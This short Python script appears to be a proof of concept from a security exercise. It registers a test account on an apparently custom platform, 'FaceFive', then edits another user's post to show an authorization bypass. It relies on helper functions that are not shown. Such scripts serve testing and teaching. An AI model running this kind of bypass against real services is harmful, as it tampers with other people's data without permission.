# vuln9.py

# PoC for unauthorized request. Authorization bypass on post edits.
#
# The platform allows any user to edit any post stored in the database.

from tools import *
import sys
import os

debug = 'DEBUG' in os.environ and os.environ['DEBUG'] == '1'

url = sys.argv[1]

session = FaceFiveSession(url)

user = 'test'
passwd = 'testpasswd'
content = 'ThisIsNewContent'

reset_image(session)
register(session, user, passwd)

r = edit_post(session, 2, content)

assert content in r.text
